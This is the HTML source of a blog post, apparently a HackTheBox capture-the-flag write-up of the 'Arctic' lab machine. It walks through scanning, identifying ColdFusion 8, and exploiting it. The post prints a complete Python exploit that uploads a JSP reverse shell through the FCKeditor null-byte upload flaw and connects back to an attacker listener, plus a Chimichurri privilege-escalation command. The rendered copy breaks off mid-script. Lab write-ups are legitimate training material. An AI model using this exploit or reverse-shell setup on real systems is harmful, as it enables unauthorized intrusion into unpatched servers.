<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Arctic | PwndSide</title><meta name=keywords content="windows,web,privesc"><meta name=description content="Windows machine with a fmtp port running ColdFusion v8, thanks to a RCE vuln we have obtained access to the user. The privEsc is similar as Bastard machine taking advantage of Chimichurri.exe exploit."><meta name=author content="Ayman Boulaich"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.8fe10233a706bc87f2e08b3cf97b8bd4c0a80f10675a143675d59212121037c0.css integrity="sha256-j+ECM6cGvIfy4Is8+XuL1MCoDxBnWhQ2ddWSEhIQN8A=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=http://localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/arctic-htb/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="http://localhost:1313/posts/arctic-htb/"><meta property="og:site_name" content="PwndSide"><meta property="og:title" content="Arctic"><meta property="og:description" content="Windows machine with a fmtp port running ColdFusion v8, thanks to a RCE vuln we have obtained access to the user. The privEsc is similar as Bastard machine taking advantage of Chimichurri.exe exploit."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-08-22T22:29:45+02:00"><meta property="article:modified_time" content="2023-08-22T22:29:45+02:00"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Web"><meta property="article:tag" content="Privesc"><meta property="og:image" content="http://localhost:1313/%3Cimage%20path/url%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Cimage%20path/url%3E"><meta name=twitter:title content="Arctic"><meta name=twitter:description content="Windows machine with a fmtp port running ColdFusion v8, thanks to a RCE vuln we have obtained access to the user. The privEsc is similar as Bastard machine taking advantage of Chimichurri.exe exploit."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"Arctic","item":"http://localhost:1313/posts/arctic-htb/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Arctic","name":"Arctic","description":"Windows machine with a fmtp port running ColdFusion v8, thanks to a RCE vuln we have obtained access to the user. The privEsc is similar as Bastard machine taking advantage of Chimichurri.exe exploit.","keywords":["windows","web","privesc"],"articleBody":"Room Information Room name: Arctic Difficulty level: Easy Room link: https://app.hackthebox.com/machines/Arctic Tools Used nmap searchsploit chimichurri.exe Port Scanning sudo nmap $IP -n -Pn -vvv --min-rate 5000 6 │ PORT STATE SERVICE REASON VERSION 7 │ 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 8 │ 8500/tcp open fmtp? syn-ack ttl 127 9 │ 49154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 10 │ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows The scan shows three open:\n2 rpc ports on 135 and 49154\nA fmtp port on 8500 and our point of entry.\nEnumeration Googling I found that fmtp port is a communication stack based on the transmission control and internet protocols. It helps to understand a little bit more what we have in front of us.\nI tried to connect via netcat to this port.\nBut doesn’t output nothing.\nWith curl I test if there is a answer for a http request with GET method.\nThe answer had a 30s delay but we know now that is running a website.\nThe website leaks two directories CFIDE and cfdocs which makes me think that we are in front of a ColdFusion.\nColdFusion is a commercial rapid web-application development computing platform.\nAs the website is extremely slow we are not brute forcing the website.\nNavigating throw the folders we can find one interesting root /CFIDE/administrator which is a login page for ColdFusion v8, I tried default/common credentials but no one worked, so let’s check if there is some exploit for it.\nExploiting We have one exploit with RCE so let’s check what it does.\n#!/usr/bin/python3 from multiprocessing import Process import io import mimetypes import os import urllib.request import uuid rhost = \"10.10.10.11\" # Dirección IP del host de destino rport = 8500 # Puerto del host de destino lhost = \"10.10.14.9\" # Dirección IP de tu máquina (el atacante) lport = 4444 # Puerto en tu máquina para recibir la conexión inversa filename = uuid.uuid4().hex class MultiPartForm: def __init__(self): self.files = [] self.boundary = uuid.uuid4().hex.encode('utf-8') return def get_content_type(self): return 'multipart/form-data; boundary={}'.format(self.boundary.decode('utf-8')) def add_file(self, fieldname, filename, fileHandle, mimetype=None): body = fileHandle.read() if mimetype is None: mimetype = (mimetypes.guess_type(filename)[0] or 'application/octet-stream') self.files.append((fieldname, filename, mimetype, body)) return @staticmethod def _attached_file(name, filename): return (f'Content-Disposition: form-data; name=\"{name}\"; filename=\"{filename}\"\\r\\n').encode('utf-8') @staticmethod def _content_type(ct): return 'Content-Type: {}\\r\\n'.format(ct).encode('utf-8') def __bytes__(self): buffer = io.BytesIO() boundary = b'--' + self.boundary + b'\\r\\n' for f_name, filename, f_content_type, body in self.files: buffer.write(boundary) buffer.write(self._attached_file(f_name, filename)) buffer.write(self._content_type(f_content_type)) buffer.write(b'\\r\\n') buffer.write(body) buffer.write(b'\\r\\n') buffer.write(b'--' + self.boundary + b'--\\r\\n') return buffer.getvalue() def execute_payload(): print('\\nExecuting the payload...') print(urllib.request.urlopen(f'http://{rhost}:{rport}/userfiles/file/{filename}.jsp').read().decode('utf-8')) def listen_connection(): print('\\nListening for connection...') os.system(f'nc -lv {lport}') if __name__ == '__main__': # Define some information lhost = \"10.10.14.9\" lport = 4444 rhost = \"10.10.10.11\" rport = 8500 filename = uuid.uuid4().hex # Generate a payload that connects back and spawns a command shell print(\"\\nGenerating a payload...\") os.system(f'msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -o {filename}.jsp') # Encode the form data form = MultiPartForm() form.add_file('newfile', filename + '.txt', fileHandle=open(filename + '.jsp', 'rb')) data = bytes(form) # Create a request request = urllib.request.Request(f'http://{rhost}:{rport}/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload\u0026Type=File\u0026CurrentFolder=/{filename}.jsp%00', data=data) request.add_header('Content-type', form.get_content_type()) request.add_header('Content-length', len(data)) # Print the request print('\\nPriting request...') for name, value in request.header_items(): print(f'{name}: {value}') print('\\n' + request.data.decode('utf-8')) # Send the request and print the response print('\\nSending request and printing response...') print(urllib.request.urlopen(request).read().decode('utf-8')) # Print some information print('\\nPrinting some information for debugging...') print(f'lhost: {lhost}') print(f'lport: {lport}') print(f'rhost: {rhost}') print(f'rport: {rport}') print(f'payload: {filename}.jsp') # Delete the payload print(\"\\nDeleting the payload...\") os.system(f'rm {filename}.jsp') # Listen for connections and execute the payload p1 = Process(target=listen_connection) p1.start() p2 = Process(target=execute_payload) p2.start() p1.join() p2.join() http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload\u0026Type=File\u0026CurrentFolder=/{filename}.jsp%00 The exploit access to the above url to execute an upload resource which help us to upload a jsp reverse shell, then the exploit access to the next url.\nhttp://{rhost}:{rport}/userfiles/file/{filename}.jsp I wonder that it’s where the reverse shell is uploaded.\nGaining an Initial Foothold Once executed we gain access as tolis.\nLet’s cat the user’s flag.\nEscalating Privilege Now let’s elevate the privileges.\nFirst let’s see what operating system we are using\nsysteminfo Host Name: ARCTIC OS Name: Microsoft Windows Server 2008 R2 Standard OS Version: 6.1.7600 N/A Build 7600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 55041-507-9857321-84451 Original Install Date: 22/3/2017, 11:09:45 �� System Boot Time: 23/8/2023, 9:42:49 �� System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 1 Processor(s) Installed. [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: el;Greek Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul Total Physical Memory: 6.143 MB Available Physical Memory: 5.024 MB Virtual Memory: Max Size: 12.285 MB Virtual Memory: Available: 11.203 MB Virtual Memory: In Use: 1.082 MB Page File Location(s): C:\\pagefile.sys Domain: HTB Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.11 This version is Microsoft Windows Server 2008 R2 Standard as we know is vulnerable to MS10-059 which we have already privesc in the Bastard machine so I am going to skip that part and go to direct to the execution of Chimichurri.exe in order to privesc.\nnc -lv 4445 .\\Chimichurri 10.10.14.9 4445 Let’s cat the root’s flag.\nThank you for reading, and happy hacking! 😄\n","wordCount":"886","inLanguage":"en","image":"http://localhost:1313/%3Cimage%20path/url%3E","datePublished":"2023-08-22T22:29:45+02:00","dateModified":"2023-08-22T22:29:45+02:00","author":{"@type":"Person","name":"Ayman Boulaich"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/arctic-htb/"},"publisher":{"@type":"Organization","name":"PwndSide","logo":{"@type":"ImageObject","url":"http://localhost:1313/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="PwndSide (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>PwndSide</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/categories/hackthebox title=HackTheBox><span>HackTheBox</span></a></li><li><a href=http://localhost:1313/categories/ctf title="CTF's"><span>CTF's</span></a></li><li><a href=http://localhost:1313/about/whoami/ title=whoami><span>whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=http://localhost:1313/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Arctic</h1><div class=post-description>Windows machine with a fmtp port running ColdFusion v8, thanks to a RCE vuln we have obtained access to the user. The privEsc is similar as Bastard machine taking advantage of Chimichurri.exe exploit.</div><div class=post-meta><span title='2023-08-22 22:29:45 +0200 CEST'>August 22, 2023</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;886 words&nbsp;·&nbsp;Ayman Boulaich&nbsp;|&nbsp;<a href=https://github.com/pwndside/pwndside.github.io/content/posts/arctic-htb.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#room-information>Room Information</a></li><li><a href=#tools-used>Tools Used</a></li><li><a href=#port-scanning>Port Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploiting>Exploiting</a></li><li><a href=#gaining-an-initial-foothold>Gaining an Initial Foothold</a></li><li><a href=#escalating-privilege>Escalating Privilege</a></li></ul></nav></div></details></div><div class=post-content><h2 id=room-information>Room Information<a hidden class=anchor aria-hidden=true href=#room-information>#</a></h2><ul><li>Room name: Arctic</li><li>Difficulty level: Easy</li><li>Room link: <a href=https://app.hackthebox.com/machines/Arctic>https://app.hackthebox.com/machines/Arctic</a></li></ul><p><img alt=Untitled loading=lazy src=/HTB/arctic-icon.png></p><h2 id=tools-used>Tools Used<a hidden class=anchor aria-hidden=true href=#tools-used>#</a></h2><ul><li>nmap</li><li>searchsploit</li><li>chimichurri.exe</li></ul><h2 id=port-scanning>Port Scanning<a hidden class=anchor aria-hidden=true href=#port-scanning>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap <span class=nv>$IP</span> -n -Pn -vvv --min-rate <span class=m>5000</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>   <span class=m>6</span>   │ PORT      STATE SERVICE REASON          VERSION
</span></span><span class=line><span class=cl>   <span class=m>7</span>   │ 135/tcp   open  msrpc   syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>   <span class=m>8</span>   │ 8500/tcp  open  fmtp?   syn-ack ttl <span class=m>127</span>
</span></span><span class=line><span class=cl>   <span class=m>9</span>   │ 49154/tcp open  msrpc   syn-ack ttl <span class=m>127</span> Microsoft Windows RPC
</span></span><span class=line><span class=cl>  <span class=m>10</span>   │ Service Info: OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span></code></pre></div><p>The scan shows three open:</p><p>2 <strong>rpc</strong> ports on <strong>135</strong> and <strong>49154</strong></p><p>A <strong>fmtp</strong> port on <strong>8500</strong> and our point of entry.</p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p>Googling I found that <strong>fmtp</strong> port is <strong>a</strong> communication stack based on the transmission control and internet protocols. It helps to understand a little bit more what we have in front of us.</p><p>I tried to connect via <strong>netcat</strong> to this port.</p><p><img alt=Untitled loading=lazy src=/HTB/arctic-1.png></p><p>But doesn’t output nothing.</p><p>With curl I test if there is a answer for a http request with <strong>GET</strong> method.</p><p><img alt=Untitled loading=lazy src=/HTB/arctic-2.png></p><p>The answer had a 30s delay but we know now that is running a website.</p><p><img alt=Untitled loading=lazy src=/HTB/arctic-3.png></p><p>The website leaks two directories <code>CFIDE</code> and <code>cfdocs</code> which makes me think that we are in front of a ColdFusion.</p><p>ColdFusion is a commercial rapid web-application development computing platform.</p><p>As the website is extremely slow we are not brute forcing the website.</p><p><img alt=Untitled loading=lazy src=/HTB/arctic-4.png></p><p>Navigating throw the folders we can find one interesting root <code>/CFIDE/administrator</code> which is a login page for <strong>ColdFusion v8</strong>, I tried default/common credentials but no one worked, so let’s check if there is some exploit for it.</p><h2 id=exploiting>Exploiting<a hidden class=anchor aria-hidden=true href=#exploiting>#</a></h2><p><img alt=Untitled loading=lazy src=/HTB/arctic-5.png></p><p>We have one exploit with <strong>RCE</strong> so let’s check what it does.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>multiprocessing</span> <span class=kn>import</span> <span class=n>Process</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>io</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>mimetypes</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>urllib.request</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>uuid</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rhost</span> <span class=o>=</span> <span class=s2>&#34;10.10.10.11&#34;</span>  <span class=c1># Dirección IP del host de destino</span>
</span></span><span class=line><span class=cl><span class=n>rport</span> <span class=o>=</span> <span class=mi>8500</span>           <span class=c1># Puerto del host de destino</span>
</span></span><span class=line><span class=cl><span class=n>lhost</span> <span class=o>=</span> <span class=s2>&#34;10.10.14.9&#34;</span>   <span class=c1># Dirección IP de tu máquina (el atacante)</span>
</span></span><span class=line><span class=cl><span class=n>lport</span> <span class=o>=</span> <span class=mi>4444</span>           <span class=c1># Puerto en tu máquina para recibir la conexión inversa</span>
</span></span><span class=line><span class=cl><span class=n>filename</span> <span class=o>=</span> <span class=n>uuid</span><span class=o>.</span><span class=n>uuid4</span><span class=p>()</span><span class=o>.</span><span class=n>hex</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>MultiPartForm</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>files</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>boundary</span> <span class=o>=</span> <span class=n>uuid</span><span class=o>.</span><span class=n>uuid4</span><span class=p>()</span><span class=o>.</span><span class=n>hex</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>get_content_type</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;multipart/form-data; boundary=</span><span class=si>{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>boundary</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>add_file</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>fieldname</span><span class=p>,</span> <span class=n>filename</span><span class=p>,</span> <span class=n>fileHandle</span><span class=p>,</span> <span class=n>mimetype</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>body</span> <span class=o>=</span> <span class=n>fileHandle</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>mimetype</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>mimetype</span> <span class=o>=</span> <span class=p>(</span><span class=n>mimetypes</span><span class=o>.</span><span class=n>guess_type</span><span class=p>(</span><span class=n>filename</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span> <span class=ow>or</span> <span class=s1>&#39;application/octet-stream&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>files</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>fieldname</span><span class=p>,</span> <span class=n>filename</span><span class=p>,</span> <span class=n>mimetype</span><span class=p>,</span> <span class=n>body</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@staticmethod</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_attached_file</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>filename</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=sa>f</span><span class=s1>&#39;Content-Disposition: form-data; name=&#34;</span><span class=si>{</span><span class=n>name</span><span class=si>}</span><span class=s1>&#34;; filename=&#34;</span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s1>&#34;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@staticmethod</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_content_type</span><span class=p>(</span><span class=n>ct</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;Content-Type: </span><span class=si>{}</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>ct</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__bytes__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>buffer</span> <span class=o>=</span> <span class=n>io</span><span class=o>.</span><span class=n>BytesIO</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>boundary</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;--&#39;</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>boundary</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>f_name</span><span class=p>,</span> <span class=n>filename</span><span class=p>,</span> <span class=n>f_content_type</span><span class=p>,</span> <span class=n>body</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>files</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>buffer</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>boundary</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>buffer</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>_attached_file</span><span class=p>(</span><span class=n>f_name</span><span class=p>,</span> <span class=n>filename</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>buffer</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>_content_type</span><span class=p>(</span><span class=n>f_content_type</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>buffer</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>buffer</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>buffer</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>buffer</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;--&#39;</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>boundary</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;--</span><span class=se>\r\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>buffer</span><span class=o>.</span><span class=n>getvalue</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>execute_payload</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>Executing the payload...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>urllib</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>urlopen</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;http://</span><span class=si>{</span><span class=n>rhost</span><span class=si>}</span><span class=s1>:</span><span class=si>{</span><span class=n>rport</span><span class=si>}</span><span class=s1>/userfiles/file/</span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s1>.jsp&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>listen_connection</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>Listening for connection...&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;nc -lv </span><span class=si>{</span><span class=n>lport</span><span class=si>}</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># Define some information</span>
</span></span><span class=line><span class=cl>    <span class=n>lhost</span> <span class=o>=</span> <span class=s2>&#34;10.10.14.9&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>lport</span> <span class=o>=</span> <span class=mi>4444</span>
</span></span><span class=line><span class=cl>    <span class=n>rhost</span> <span class=o>=</span> <span class=s2>&#34;10.10.10.11&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>rport</span> <span class=o>=</span> <span class=mi>8500</span>
</span></span><span class=line><span class=cl>    <span class=n>filename</span> <span class=o>=</span> <span class=n>uuid</span><span class=o>.</span><span class=n>uuid4</span><span class=p>()</span><span class=o>.</span><span class=n>hex</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Generate a payload that connects back and spawns a command shell</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Generating a payload...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;msfvenom -p java/jsp_shell_reverse_tcp LHOST=</span><span class=si>{</span><span class=n>lhost</span><span class=si>}</span><span class=s1> LPORT=</span><span class=si>{</span><span class=n>lport</span><span class=si>}</span><span class=s1> -o </span><span class=si>{</span><span class=n>filename</span><span class=si>}</span><span class=s1>.jsp&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Encode the form data</span>
</span></span><span class=line><span class=cl>    <span class=n>form</span> <span class=o>=</span> <span class=n>MultiPartForm</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>form</span><span class=o>.</span><span class=n>add_file</span><span class=p>(</span><span class=s1>&#39;newfile&#39;</span><span class=p>,</span> <span class=n>filename</span> <span class=o>+</span> <span class=s1>&#39;.txt&#39;</span><span class=p>,</span> <span class=n>fileHandle</span><span class=o>=</span><span class=nb>open</span><span class=p>(</span><span class=n>filename</span> <span class=o>+</span> <span class=s1>&#39;.jsp&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>form</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># Create a request</span>
